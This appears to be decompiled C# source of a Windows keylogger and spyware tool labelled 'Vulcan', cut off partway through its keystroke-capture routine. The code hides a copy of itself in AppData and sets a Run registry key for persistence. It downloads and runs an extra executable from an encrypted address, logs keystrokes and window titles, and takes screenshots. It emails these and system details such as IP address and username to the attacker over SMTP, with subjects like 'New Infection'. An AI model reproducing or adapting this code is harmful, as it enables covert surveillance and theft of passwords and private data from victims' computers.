using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[DesignerGenerated]
public class Form1 : Form
{
	private object i;

	private string strin;

	private object pubHfwT;

	private int charCount;

	private int lineLimit;

	private object bHfPLgsKXM;

	private string msgtitle;

	private string msgb;

	private MessageBoxIcon msgtype;

	private string WrfcjuBcFdlc;

	private string aPcACnMchD;

	private string port;

	private string smtp;

	private string xYeaTceubPMsL;

	private string hLteM;

	private string TDcccdfZAbhiaua;

	private string interval;

	private bool ss;

	private bool dl;

	private bool wb;

	private bool ci;

	private bool su;

	private bool mel;

	private bool msg;

	private Bitmap bmpScreenShot;

	private Graphics gfxScreenshot;

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick((EventHandler)Timer2_Tick);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick((EventHandler)Timer2_Tick);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		strin = null;
		lineLimit = 69;
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int nVirtKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string WUmflhS()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	[STAThread]
	public static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}

	public static string fMzIDMcpj(string sOut, string sKey)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		sKey = Yqah(sKey);
		tripleDESCryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(sKey));
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
		byte[] array = Convert.FromBase64String(sOut);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		WrfcjuBcFdlc = fMzIDMcpj("JDp/nZ/3IuUr5HLG9UHddQ==", Conversions.ToString(987231145));
		aPcACnMchD = fMzIDMcpj("0Bf5sKpxWXGlQ09lgRJ7gh+gb8+xF4UjuehK1I9/7eI=", WrfcjuBcFdlc);
		xYeaTceubPMsL = fMzIDMcpj("B/tpXQ7/Ocx0bwYdzSxArg==", WrfcjuBcFdlc);
		hLteM = fMzIDMcpj("YIg8/c8mIPQ=", WrfcjuBcFdlc);
		TDcccdfZAbhiaua = fMzIDMcpj("3ooUPoCld5w/2l9xUnAR9fp102F+LpWXwjja1ledf4diOGPF25tGFA==", WrfcjuBcFdlc);
		msgtitle = "";
		msgb = "";
		msgtype = (MessageBoxIcon)48;
		port = "587";
		interval = Conversions.ToString(720000);
		smtp = "smtp.live.com";
		ss = true;
		dl = true;
		wb = true;
		ci = true;
		su = true;
		mel = true;
		msg = false;
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\File Name.exe"))
		{
			if (Operators.CompareString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Application.get_StartupPath(), false) == 0)
			{
				Timer1.set_Interval(Conversions.ToInteger(interval));
				Timer2.Start();
				Timer1.Start();
			}
		}
		else
		{
			string text = Conversions.ToString(WDrchwfMk(3, 50000));
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\File Name.exe");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\File Name.exe");
			FileAttributes fileAttributes = FileAttributes.Hidden;
			File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\File Name.exe", FileAttributes.Hidden);
			if (su)
			{
				string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
				string name2 = "Windows applicaton";
				string value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\File Name.exe";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
				registryKey.SetValue(name2, value, RegistryValueKind.String);
			}
			if (msg)
			{
				MessageBox.Show(msgb, msgtitle, (MessageBoxButtons)0, msgtype);
			}
			if (wb)
			{
				Process.Start(hLteM);
			}
			if (dl)
			{
				heIAyMCfK(TDcccdfZAbhiaua, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe", fileAttributes);
			}
			if (mel)
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			nlbZ();
		}
		((Control)this).Hide();
	}

	public bool ckDKPQddh()
	{
		return (GetKeyState(20) & 1) != 0;
	}

	public bool dFpchsNs()
	{
		return GetAsyncKeyState(16) != 0;
	}

	public bool aMehD()
	{
		return GetAsyncKeyState(17) != 0;
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		if (Operators.CompareString(TextBox1.get_Text(), "", false) == 0)
		{
			TextBox1.set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(WDrchwfMk(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(aPcACnMchD);
			mailMessage.To.Add(aPcACnMchD);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)MyProject.Computer).get_Name() + "]: Program Is Off Now";
			if (ss)
			{
				try
				{
					bmpScreenShot = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					gfxScreenshot = Graphics.FromImage((Image)(object)bmpScreenShot);
					gfxScreenshot.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bmpScreenShot).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (ci)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + GetMyIP().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + zldFRbivt();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient(smtp);
			smtpClient.Port = Conversions.ToInteger(port);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(aPcACnMchD, xYeaTceubPMsL);
			smtpClient.Send(mailMessage);
			TextBox1.set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void nlbZ()
	{
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		try
		{
			string text = Conversions.ToString(WDrchwfMk(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(aPcACnMchD);
			mailMessage.To.Add(aPcACnMchD);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)MyProject.Computer).get_Name() + "]: New Infection";
			if (ss)
			{
				try
				{
					bmpScreenShot = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					gfxScreenshot = Graphics.FromImage((Image)(object)bmpScreenShot);
					gfxScreenshot.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bmpScreenShot).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (ci)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + GetMyIP().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + zldFRbivt();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += "New Infection!!!";
			SmtpClient smtpClient = new SmtpClient(smtp);
			smtpClient.Port = Conversions.ToInteger(port);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(aPcACnMchD, xYeaTceubPMsL);
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		if (Operators.CompareString(TextBox1.get_Text(), "", false) == 0)
		{
			TextBox1.set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(WDrchwfMk(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(aPcACnMchD);
			mailMessage.To.Add(aPcACnMchD);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)MyProject.Computer).get_Name() + "]: logs";
			if (ss)
			{
				try
				{
					bmpScreenShot = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					gfxScreenshot = Graphics.FromImage((Image)(object)bmpScreenShot);
					gfxScreenshot.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bmpScreenShot).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (ci)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + GetMyIP().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + zldFRbivt();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient(smtp);
			smtpClient.Port = Conversions.ToInteger(port);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(aPcACnMchD, xYeaTceubPMsL);
			smtpClient.Send(mailMessage);
			TextBox1.set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						if (Operators.CompareString(strin, WUmflhS(), false) != 0)
						{
							goto IL_0018;
						}
						goto IL_0055;
					case 7103:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0018;
							case 3:
								goto IL_0046;
							case 4:
							case 5:
								goto IL_0055;
							case 6:
								goto IL_005d;
							case 7:
								goto IL_0072;
							case 8:
								goto IL_008d;
							case 9:
								goto IL_0097;
							case 11:
							case 12:
								goto IL_00ab;
							case 13:
								goto IL_00c1;
							case 14:
								goto IL_00dd;
							case 15:
								goto IL_00ec;
							case 17:
							case 18:
								goto IL_0103;
							case 19:
								goto IL_0118;
							case 20:
								goto IL_0134;
							case 21:
								goto IL_0143;
							case 23:
							case 24:
								goto IL_015a;
							case 25:
								goto IL_0170;
							case 26:
								goto IL_018c;
							case 29:
							case 30:
								goto IL_01a0;
							case 31:
								goto IL_01b9;
							case 32:
								goto IL_01d5;
							case 33:
								goto IL_01e1;
							case 35:
								goto IL_01f5;
							case 36:
								goto IL_01f9;
							case 40:
							case 41:
								goto IL_020d;
							case 42:
								goto IL_0226;
							case 43:
								goto IL_0242;
							case 44:
								goto IL_024e;
							case 46:
								goto IL_0262;
							case 47:
								goto IL_0266;
							case 51:
							case 52:
								goto IL_027a;
							case 53:
								goto IL_0293;
							case 54:
								goto IL_02af;
							case 55:
								goto IL_02bb;
							case 57:
								goto IL_02cf;
							case 58:
								goto IL_02d3;
							case 62:
							case 63:
								goto IL_02e7;
							case 64:
								goto IL_0300;
							case 65:
								goto IL_031c;
							case 66:
								goto IL_0328;
							case 68:
								goto IL_033c;
							case 69:
								goto IL_0340;
							case 73:
							case 74:
								goto IL_0354;
							case 75:
								goto IL_036d;
							case 76:
								goto IL_0389;
							case 77:
								goto IL_0395;
							case 79:
								goto IL_03a9;
							case 80:
								goto IL_03ad;
							case 84:
							case 85:
								goto IL_03c1;
							case 86:
								goto IL_03da;
							case 87:
								goto IL_03f6;
							case 88:
								goto IL_0402;
							case 90:
								goto IL_0416;
							case 91:
								goto IL_041a;
							case 95:
							case 96:
								goto IL_042e;
							case 97:
								goto IL_0447;
							case 98:
								goto IL_0463;
							case 99:
								goto IL_046f;
							case 101:
								goto IL_0483;
							case 102:
								goto IL_0487;
							case 106:
							case 107:
								goto IL_049b;
							case 108:
								goto IL_04b1;
							case 109:
								goto IL_04cd;
							case 110:
								goto IL_04d9;
							case 112:
								goto IL_04ed;
							case 113:
								goto IL_04f1;
							case 117:
							case 118:
								goto IL_0505;
							case 119:
								goto IL_051b;
							case 120:
								goto IL_0537;
							case 121:
								goto IL_0543;
							case 123:
								goto IL_0557;
							case 124:
								goto IL_055b;
							case 128:
							case 129:
								goto IL_056f;
							case 130:
								goto IL_0588;
							case 131:
								goto IL_05a7;
							case 132:
								goto IL_05b6;
							case 134:
								goto IL_05cd;
							case 135:
								goto IL_05d4;
							case 139:
							case 140:
								goto IL_05eb;
							case 141:
								goto IL_0604;
							case 142:
								goto IL_0623;
							case 143:
								goto IL_0632;
							case 145:
								goto IL_0649;
							case 146:
								goto IL_0650;
							case 150:
							case 151:
								goto IL_0667;
							case 152:
								goto IL_0680;
							case 153:
								goto IL_069f;
							case 154:
								goto IL_06ae;
							case 156:
								goto IL_06c5;
							case 157:
								goto IL_06cc;
							case 161:
							case 162:
								goto IL_06e3;
							case 163:
								goto IL_06fc;
							case 164:
								goto IL_071b;
							case 165:
								goto IL_072a;
							case 167:
								goto IL_0741;
							case 168:
								goto IL_0748;
							case 172:
							case 173:
								goto IL_075f;
							case 174:
								goto IL_0778;
							case 175:
								goto IL_0797;
							case 176:
								goto IL_07a6;
							case 178:
								goto IL_07bd;
							case 179:
								goto IL_07c4;
							case 183:
							case 184:
								goto IL_07db;
							case 185:
								goto IL_07f4;
							case 186:
								goto IL_0813;
							case 187:
								goto IL_0822;
							case 189:
								goto IL_0839;
							case 190:
								goto IL_0840;
							case 194:
							case 195:
								goto IL_0857;
							case 196:
								goto IL_0870;
							case 197:
								goto IL_088f;
							case 198:
								goto IL_089e;
							case 200:
								goto IL_08b5;
							case 201:
								goto IL_08bc;
							case 205:
							case 206:
								goto IL_08d3;
							case 207:
								goto IL_08ec;
							case 208:
								goto IL_090b;
							case 209:
								goto IL_091a;
							case 211:
								goto IL_0931;
							case 212:
								goto IL_0938;
							case 216:
							case 217:
								goto IL_094f;
							case 218:
								goto IL_0968;
							case 219:
								goto IL_0987;
							case 220:
								goto IL_0996;
							case 221:
								goto IL_09a8;
							case 223:
								goto IL_09c2;
							case 224:
								goto IL_09c9;
							case 227:
							case 228:
								goto IL_09e0;
							case 229:
								goto IL_09f9;
							case 230:
								goto IL_0a18;
							case 231:
								goto IL_0a27;
							case 233:
								goto IL_0a3e;
							case 234:
								goto IL_0a45;
							case 238:
							case 239:
								goto IL_0a5c;
							case 240:
								goto IL_0a75;
							case 241:
								goto IL_0a94;
							case 243:
							case 244:
								goto IL_0aab;
							case 245:
								goto IL_0ac4;
							case 246:
								goto IL_0ae3;
							case 247:
								goto IL_0af2;
							case 249:
								goto IL_0b09;
							case 250:
								goto IL_0b10;
							case 254:
							case 255:
								goto IL_0b27;
							case 256:
								goto IL_0b40;
							case 257:
								goto IL_0b5f;
							case 258:
								goto IL_0b6e;
							case 260:
								goto IL_0b85;
							case 261:
								goto IL_0b8c;
							case 265:
							case 266:
								goto IL_0ba3;
							case 267:
								goto IL_0bbc;
							case 268:
								goto IL_0bdb;
							case 271:
							case 272:
								goto IL_0bf2;
							case 273:
								goto IL_0c0a;
							case 274:
								goto IL_0c29;
							case 275:
								goto IL_0c38;
							case 277:
								goto IL_0c4f;
							case 278:
								goto IL_0c56;
							case 282:
							case 283:
								goto IL_0c6d;
							case 284:
								goto IL_0c89;
							case 285:
								goto IL_0ca8;
							case 286:
								goto IL_0cb7;
							case 288:
								goto IL_0cce;
							case 289:
								goto IL_0cd5;
							case 293:
							case 294:
								goto IL_0cec;
							case 295:
								goto IL_0d08;
							case 296:
								goto IL_0d27;
							case 297:
								goto IL_0d36;
							case 299:
								goto IL_0d4d;
							case 300:
								goto IL_0d54;
							case 304:
							case 305:
								goto IL_0d6d;
							case 306:
								goto IL_0d89;
							case 307:
								goto IL_0da8;
							case 308:
								goto IL_0db7;
							case 310:
								goto IL_0dce;
							case 311:
								goto IL_0dd5;
							case 315:
							case 316:
								goto IL_0dec;
							case 317:
								goto IL_0e08;
							case 318:
								goto IL_0e27;
							case 319:
								goto IL_0e36;
							case 321:
								goto IL_0e4d;
							case 322:
								goto IL_0e54;
							case 326:
							case 327:
								goto IL_0e6b;
							case 328:
								goto IL_0e9e;
							case 329:
								goto IL_0ec0;
							case 370:
							case 371:
								goto IL_0edf;
							case 330:
								goto IL_0eff;
							case 331:
								goto IL_0f11;
							case 361:
							case 362:
								goto IL_0f5f;
							case 333:
							case 335:
								goto IL_0f76;
							case 337:
							case 338:
								goto IL_0f8d;
							case 340:
							case 341:
								goto IL_0fa4;
							case 343:
							case 344:
								goto IL_0fbb;
							case 346:
							case 347:
								goto IL_0fd2;
							case 349:
							case 350:
								goto IL_0fe9;
							case 352:
							case 353:
								goto IL_1000;
							case 355:
							case 356:
								goto IL_1017;
							case 358:
							case 359:
								goto IL_102e;
							case 365:
								goto IL_1045;
							case 366:
								goto IL_104c;
							case 372:
								goto IL_1073;
							case 373:
								goto IL_10a9;
							case 374:
								goto IL_10cb;
							case 393:
							case 394:
								goto IL_10ea;
							case 375:
								goto IL_110b;
							case 376:
								goto IL_111a;
							case 377:
								goto IL_1129;
							case 379:
								goto IL_1155;
							case 380:
								goto IL_115c;
							case 383:
								goto IL_1185;
							case 384:
								goto IL_118c;
							case 385:
								goto IL_119b;
							case 387:
								goto IL_11c4;
							case 388:
								goto IL_11cb;
							case 10:
							case 16:
							case 22:
							case 27:
							case 34:
							case 37:
							case 38:
							case 45:
							case 48:
							case 49:
							case 56:
							case 59:
							case 60:
							case 67:
							case 70:
							case 71:
							case 78:
							case 81:
							case 82:
							case 89:
							case 92:
							case 93:
							case 100:
							case 103:
							case 104:
							case 111:
							case 114:
							case 115:
							case 122:
							case 125:
							case 126:
							case 133:
							case 136:
							case 137:
							case 144:
							case 147:
							case 148:
							case 155:
							case 158:
							case 159:
							case 166:
							case 169:
							case 170:
							case 177:
							case 180:
							case 181:
							case 188:
							case 191:
							case 192:
							case 199:
							case 202:
							case 203:
							case 210:
							case 213:
							case 214:
							case 222:
							case 225:
							case 226:
							case 232:
							case 235:
							case 236:
							case 242:
							case 248:
							case 251:
							case 252:
							case 259:
							case 262:
							case 263:
							case 269:
							case 276:
							case 279:
							case 280:
							case 287:
							case 290:
							case 291:
							case 298:
							case 301:
							case 302:
							case 309:
							case 312:
							case 313:
							case 320:
							case 323:
							case 324:
							case 332:
							case 336:
							case 339:
							case 342:
							case 345:
							case 348:
							case 351:
							case 354:
							case 357:
							case 360:
							case 363:
							case 364:
							case 367:
							case 368:
							case 378:
							case 381:
							case 382:
							case 386:
							case 389:
							case 390:
							case 391:
							case 397:
								goto IL_11f2;
							case 398:
								goto IL_1207;
							case 399:
								goto IL_1215;
							case 400:
							case 401:
								goto IL_122c;
							case 402:
								goto IL_1246;
							case 403:
							case 404:
								goto IL_1263;
							case 395:
								goto end_IL_0000_2;
							case 28:
								num = 28;
								charCount++;
								goto IL_01a0;
							case 39:
								num = 39;
								charCount++;
								goto IL_020d;
							case 50:
								num = 50;
								charCount++;
								goto IL_027a;
							case 61:
								num = 61;
								charCount++;
								goto IL_02e7;
							case 72:
								num = 72;
								charCount++;
								goto IL_0354;
							case 83:
								num = 83;
								charCount++;
								goto IL_03c1;
							case 94:
								num = 94;
								charCount++;
								goto IL_042e;
							case 105:
								num = 105;
								charCount++;
								goto IL_049b;
							case 116:
								num = 116;
								charCount++;
								goto IL_0505;
							case 127:
								num = 127;
								charCount++;
								goto IL_056f;
							case 138:
								num = 138;
								charCount++;
								goto IL_05eb;
							case 149:
								num = 149;
								charCount++;
								goto IL_0667;
							case 160:
								num = 160;
								charCount++;
								goto IL_06e3;
							case 171:
								num = 171;
								charCount++;
								goto IL_075f;
							case 182:
								num = 182;
								charCount++;
								goto IL_07db;
							case 193:
								num = 193;
								charCount++;
								goto IL_0857;
							case 204:
								num = 204;
								charCount++;
								goto IL_08d3;
							case 215:
								num = 215;
								charCount++;
								goto IL_094f;
							case 237:
								num = 237;
								charCount++;
								goto IL_0a5c;
							case 253:
								num = 253;
								charCount++;
								goto IL_0b27;
							case 264:
								num = 264;
								charCount++;
								goto IL_0ba3;
							case 270:
								num = 270;
								charCount++;
								goto IL_0bf2;
							case 281:
								num = 281;
								charCount++;
								goto IL_0c6d;
							case 292:
								num = 292;
								charCount++;
								goto IL_0cec;
							case 303:
								num = 303;
								charCount++;
								goto IL_0d6d;
							case 314:
								num = 314;
								charCount++;
								goto IL_0dec;
							case 325:
								num = 325;
								charCount++;
								goto IL_0e6b;
							case 369:
								num = 369;
								charCount++;
								goto IL_0edf;
							case 392:
								num = 392;
								charCount++;
								goto IL_10ea;
							default:
								goto end_IL_0000;
							case 396:
							case 405:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_1263:
						num = 404;
						Application.DoEvents();
						goto end_IL_0000_3;
						IL_0018:
						num = 2;
						TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + WUmflhS() + "]\r\n");
						goto IL_0046;
						IL_0046:
						num = 3;
						strin = WUmflhS();
						goto IL_0055;
						IL_0055:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_005d;
						IL_005d:
						num = 6;
						pubHfwT = GetAsyncKeyState(13);
						goto IL_0072;
						IL_0072:
						num = 7;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_008d;
						}
						goto IL_00ab;
						IL_008d:
						num = 8;
						charCount = 0;
						goto IL_0097;
						IL_0097:
						num = 9;
						bHfPLgsKXM = "\r\n";
						goto IL_11f2;
						IL_00ab:
						num = 12;
						pubHfwT = GetAsyncKeyState(17);
						goto IL_00c1;
						IL_00c1:
						num = 13;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_00dd;
						}
						goto IL_0103;
						IL_00dd:
						num = 14;
						bHfPLgsKXM = "[Ctrl]";
						goto IL_00ec;
						IL_00ec:
						num = 15;
						charCount += 4;
						goto IL_11f2;
						IL_0103:
						num = 18;
						pubHfwT = GetAsyncKeyState(8);
						goto IL_0118;
						IL_0118:
						num = 19;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0134;
						}
						goto IL_015a;
						IL_0134:
						num = 20;
						bHfPLgsKXM = "[Backspace]";
						goto IL_0143;
						IL_0143:
						num = 21;
						charCount += 4;
						goto IL_11f2;
						IL_015a:
						num = 24;
						pubHfwT = GetAsyncKeyState(32);
						goto IL_0170;
						IL_0170:
						num = 25;
